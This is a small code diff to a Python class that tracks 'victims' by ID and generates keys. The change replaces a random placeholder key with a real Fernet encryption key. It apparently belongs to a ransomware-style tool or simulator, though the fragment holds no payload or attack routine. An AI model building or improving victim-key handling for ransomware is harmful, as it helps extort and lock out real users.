@@ -80,7 +80,8 @@ class PussDatabase:
         return self.victims[victim_id]
     
     def generate_key(self):
-        return 'PUSSKEY_' + ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=32))
+        from cryptography.fernet import Fernet
+        return Fernet.generate_key().decode()
     
     def get_victim(self, victim_id):
         return self.victims.get(victim_id.upper())
